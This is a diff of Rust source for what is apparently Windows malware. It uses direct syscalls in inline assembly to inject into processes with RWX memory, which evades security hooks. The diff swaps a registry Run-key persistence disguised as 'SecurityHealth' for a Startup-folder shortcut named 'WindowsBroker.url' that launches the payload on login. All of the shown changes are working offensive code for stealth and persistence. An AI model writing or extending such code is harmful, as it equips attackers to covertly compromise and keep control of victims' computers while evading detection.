@@ -5,19 +5,14 @@ use core::arch::global_asm;
 use windows::{
     Win32::System::Diagnostics::ToolHelp::*,
     Win32::Foundation::*,
-    Win32::System::Threading::{GetCurrentProcess},
-    core::{PWSTR},
 };
 use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS, PROCESS_BASIC_INFORMATION, ProcessBasicInformation};
 use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES};
-use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, LocalFree};
+use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING};
 use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
 use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
 use windows_sys::Win32::System::Kernel::{OBJ_CASE_INSENSITIVE};
-use windows_sys::Win32::System::Registry::{REG_SZ};
-use windows_sys::Win32::Security::{GetTokenInformation, TokenUser, TOKEN_USER, TOKEN_QUERY as TOKEN_QUERY_SYS};
-use windows_sys::Win32::Security::Authorization::{ConvertSidToStringSidW};
 use windows_sys::Win32::Storage::FileSystem::{FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_OPEN, FILE_OVERWRITE_IF, FILE_ATTRIBUTE_NORMAL};
 const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
 use windows_sys::Win32::Storage::FileSystem::{FILE_STANDARD_INFO, FileStandardInfo};
@@ -95,20 +90,6 @@ asm_nt_query_information_process:
     syscall
     ret
 
-.global asm_nt_open_key
-asm_nt_open_key:
-    mov r10, rcx
-    mov eax, r9d
-    syscall
-    ret
-
-.global asm_nt_set_value_key
-asm_nt_set_value_key:
-    mov r10, rcx
-    mov eax, [rsp + 0x38]
-    syscall
-    ret
-
 .global asm_nt_create_file
 asm_nt_create_file:
     mov r10, rcx
@@ -139,7 +120,6 @@ asm_nt_query_information_file:
 "#);
 
 extern "C" {
-    fn OpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: u32, TokenHandle: *mut HANDLE) -> i32;
     fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32) -> NTSTATUS;
@@ -148,8 +128,6 @@ extern "C" {
     fn asm_nt_protect_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, NumberOfBytesToProtect: &mut usize, NewProperty: u32, OldProperty: &mut u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_read_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *const std::ffi::c_void, Buffer: *mut std::ffi::c_void, NumberOfBytesToRead: usize, NumberOfBytesRead: &mut usize, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_query_information_process(ProcessHandle: HANDLE, ProcessInformationClass: u32, ProcessInformation: *mut std::ffi::c_void, ProcessInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32) -> NTSTATUS;
-    fn asm_nt_open_key(KeyHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, syscall_id: u32) -> NTSTATUS;
-    fn asm_nt_set_value_key(KeyHandle: HANDLE, ValueName: *mut UNICODE_STRING, TitleIndex: u32, Type: u32, Data: *mut std::ffi::c_void, DataSize: u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_create_file(FileHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, IoStatusBlock: *mut IO_STATUS_BLOCK, AllocationSize: *mut i64, FileAttributes: u32, ShareAccess: u32, CreateDisposition: u32, CreateOptions: u32, EaBuffer: *mut std::ffi::c_void, EaLength: u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_read_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: *mut IO_STATUS_BLOCK, Buffer: *mut std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_write_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: *mut IO_STATUS_BLOCK, Buffer: *const std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
@@ -479,92 +457,69 @@ fn reconstruct_exe(dest_path: &str) -> Option<()> {
     Some(())
 }
 
-fn get_user_sid() -> Option<String> {
-    let mut token: HANDLE = 0;
-    unsafe {
-        if OpenProcessToken(GetCurrentProcess().0 as _, TOKEN_QUERY_SYS as _, &mut token as *mut _ as *mut _) == 0 {
-            return None;
-        }
-        let mut len = 0;
-        let _ = GetTokenInformation(token, TokenUser, std::ptr::null_mut(), 0, &mut len);
-        let mut buffer = vec![0u8; len as usize];
-        if GetTokenInformation(token as _, TokenUser, buffer.as_mut_ptr() as *mut _, len, &mut len) == 0 {
-            let _ = CloseHandle(HANDLE(token));
-            return None;
-        }
-        let token_user = buffer.as_ptr() as *const TOKEN_USER;
-        let mut sid_string: *mut u16 = std::ptr::null_mut();
-        if ConvertSidToStringSidW((*token_user).User.Sid as _, &mut sid_string as *mut _ as *mut _) == 0 {
-            let _ = CloseHandle(HANDLE(token));
-            return None;
-        }
-        let result = PWSTR(sid_string).to_string().ok();
-        LocalFree(sid_string as _);
-        let _ = CloseHandle(HANDLE(token));
-        result
-    }
-}
-
 fn set_persistence(exe_path: &str) -> Option<()> {
-    let sid = get_user_sid()?;
-    let key_path = format!("\\Registry\\User\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", sid);
+    let app_data = std::env::var("APPDATA").ok()?;
+    let startup_path = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsBroker.url", app_data);
+    let nt_startup_path = format!("\\??\\{}", startup_path);
+    let mut nt_startup_u16: Vec<u16> = nt_startup_path.encode_utf16().collect();
+    nt_startup_u16.push(0);
 
-    let mut key_path_u16: Vec<u16> = key_path.encode_utf16().collect();
-    key_path_u16.push(0);
+    let shortcut_content = format!("[InternetShortcut]\nURL=file:///{}\n", exe_path.replace("\\", "/"));
+    let shortcut_bytes = shortcut_content.as_bytes();
 
-    let nt_open_key_syscall = syscall::get_syscall_number("NtOpenKey")?;
-    let nt_set_value_key_syscall = syscall::get_syscall_number("NtSetValueKey")?;
+    let nt_create_file_syscall = syscall::get_syscall_number("NtCreateFile")?;
+    let nt_write_file_syscall = syscall::get_syscall_number("NtWriteFile")?;
     let nt_close_syscall = syscall::get_syscall_number("NtClose")?;
 
-    let mut key_handle: HANDLE = 0;
-    let mut key_name = UNICODE_STRING {
-        Length: ((key_path_u16.len() - 1) * 2) as u16,
-        MaximumLength: (key_path_u16.len() * 2) as u16,
-        Buffer: key_path_u16.as_mut_ptr(),
+    let mut handle: HANDLE = 0;
+    let mut io_status = IO_STATUS_BLOCK::default();
+    let mut name = UNICODE_STRING {
+        Length: ((nt_startup_u16.len() - 1) * 2) as u16,
+        MaximumLength: (nt_startup_u16.len() * 2) as u16,
+        Buffer: nt_startup_u16.as_mut_ptr(),
     };
-
     let mut attr = OBJECT_ATTRIBUTES {
         Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
         RootDirectory: 0,
-        ObjectName: &mut key_name,
+        ObjectName: &mut name,
         Attributes: OBJ_CASE_INSENSITIVE as u32,
         SecurityDescriptor: std::ptr::null_mut(),
         SecurityQualityOfService: std::ptr::null_mut(),
     };
 
     let status = unsafe {
-        asm_nt_open_key(
-            &mut key_handle,
-            0x00020000 | 0x0002, // KEY_WRITE
+        asm_nt_create_file(
+            &mut handle,
+            FILE_GENERIC_WRITE,
             &mut attr,
-            nt_open_key_syscall,
+            &mut io_status,
+            std::ptr::null_mut(),
+            FILE_ATTRIBUTE_NORMAL,
+            0,
+            FILE_OVERWRITE_IF,
+            FILE_SYNCHRONOUS_IO_NONALERT,
+            std::ptr::null_mut(),
+            0,
+            nt_create_file_syscall,
         )
     };
-    if status != 0 { return None; }
 
-    let value_name_str = "SecurityHealth";
-    let mut value_name_u16: Vec<u16> = value_name_str.encode_utf16().collect();
-    value_name_u16.push(0);
-    let mut value_name = UNICODE_STRING {
-        Length: ((value_name_u16.len() - 1) * 2) as u16,
-        MaximumLength: (value_name_u16.len() * 2) as u16,
-        Buffer: value_name_u16.as_mut_ptr(),
-    };
-
-    let mut data_u16: Vec<u16> = exe_path.encode_utf16().collect();
-    data_u16.push(0);
-
-    unsafe {
-        asm_nt_set_value_key(
-            key_handle,
-            &mut value_name,
-            0,
-            REG_SZ,
-            data_u16.as_mut_ptr() as *mut _,
-            (data_u16.len() * 2) as u32,
-            nt_set_value_key_syscall,
-        );
-        asm_nt_close(key_handle, nt_close_syscall);
+    if status == 0 {
+        unsafe {
+            asm_nt_write_file(
+                handle,
+                0,
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                &mut io_status,
+                shortcut_bytes.as_ptr() as *const _,
+                shortcut_bytes.len() as u32,
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                nt_write_file_syscall,
+            );
+            asm_nt_close(handle, nt_close_syscall);
+        }
     }
 
     Some(())
